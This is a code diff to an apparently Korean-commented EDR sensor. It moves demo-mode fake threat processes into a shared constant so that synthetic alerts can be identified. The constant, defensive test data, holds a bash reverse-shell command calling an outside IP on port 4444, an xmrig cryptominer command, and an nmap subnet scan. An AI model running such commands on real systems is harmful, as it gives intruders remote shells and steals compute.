@@ -49,6 +49,26 @@ SERVER_PARENTS = {"nginx", "apache2", "httpd", "php-fpm", "node", "python",
 TEMP_DIRS = ("/tmp/", "/dev/shm/", "/var/tmp/", "/run/")
 
 
+# 데모 모드가 주입하는 가짜 위협 프로세스 (누적 확률, 프로세스).
+#
+# 여기 있는 cmdline 은 **실제 탐지가 만들어낼 수 없는 고정 문자열**이다. 그래서
+# 이 목록은 "이 알림이 합성인가"를 되짚는 유일하게 확실한 단서이기도 하다
+# (아카이브의 알림은 origin 이 전부 'legacy' 라 저장값으로는 가릴 수 없다).
+# modules/labeling.classify_provenance 가 이 상수를 읽는다 — 복사본을 두면
+# 시나리오가 바뀔 때 조용히 어긋나므로 반드시 여기만 고칠 것.
+DEMO_THREAT_PROCESSES = [
+    (0.10, {"ppid": 812, "name": "bash", "parent": "nginx", "user": "www-data",
+            "cmdline": "bash -i >& /dev/tcp/45.155.205.233/4444 0>&1",
+            "cpu": 0.8, "exe_path": "/bin/bash"}),
+    (0.18, {"ppid": 1, "name": "xmrig", "parent": "systemd", "user": "nobody",
+            "cmdline": "/tmp/.x/xmrig -o pool.minexmr.com:4444 -u wallet",
+            "cpu": 96.4, "exe_path": "/tmp/.x/xmrig"}),
+    (0.24, {"ppid": 905, "name": "nmap", "parent": "python", "user": "mintkangaroo",
+            "cmdline": "nmap -sS 192.168.1.0/24", "cpu": 12.0,
+            "exe_path": "/usr/bin/nmap"}),
+]
+
+
 class EDRSensor:
     def __init__(self, socketio, config=None, threat_detector=None,
                  mitre_tracker=None, ai_analyst=None, ip_reputation=None):
@@ -211,21 +231,12 @@ class EDRSensor:
         ]
         # 20% 확률로 위협 시나리오 주입
         roll = random.random()
-        if roll < 0.10:
-            base.append({"pid": random.randint(20000, 60000), "ppid": 812, "name": "bash",
-                         "parent": "nginx", "user": "www-data",
-                         "cmdline": "bash -i >& /dev/tcp/45.155.205.233/4444 0>&1",
-                         "cpu": 0.8, "exe_path": "/bin/bash"})
-        elif roll < 0.18:
-            base.append({"pid": random.randint(20000, 60000), "ppid": 1, "name": "xmrig",
-                         "parent": "systemd", "user": "nobody",
-                         "cmdline": "/tmp/.x/xmrig -o pool.minexmr.com:4444 -u wallet",
-                         "cpu": 96.4, "exe_path": "/tmp/.x/xmrig"})
-        elif roll < 0.24:
-            base.append({"pid": random.randint(20000, 60000), "ppid": 905, "name": "nmap",
-                         "parent": "python", "user": "mintkangaroo",
-                         "cmdline": "nmap -sS 192.168.1.0/24", "cpu": 12.0,
-                         "exe_path": "/usr/bin/nmap"})
+        for threshold, proc in DEMO_THREAT_PROCESSES:
+            if roll < threshold:
+                injected = dict(proc)
+                injected["pid"] = random.randint(20000, 60000)
+                base.append(injected)
+                break
         return base
 
     # ------------------------------------------------------------------ #
